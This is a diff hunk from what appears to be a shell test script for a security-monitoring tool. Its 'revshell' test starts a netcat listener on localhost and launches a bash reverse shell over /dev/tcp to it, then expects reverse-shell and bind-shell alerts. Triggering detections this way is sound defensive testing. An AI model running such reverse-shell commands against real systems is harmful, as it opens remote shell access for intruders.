@@ -56,7 +56,7 @@ revshell() {
     nc -l 127.0.0.1 4444 >/dev/null 2>&1 & PIDS+=($!)
     sleep 0.5
   fi
-  timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 & sleep 2; kill $! 2>/dev/null; true' 2>/dev/null
+  bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 & sleep 2; kill $! 2>/dev/null; true' 2>/dev/null
   expect "CRITICAL reverse-shell-cmdline, CRITICAL shell-network-connection, MEDIUM outbound-suspicious-port"
   expect "HIGH bind-shell-listener (the nc -l 'C2' on this same box)"
 }
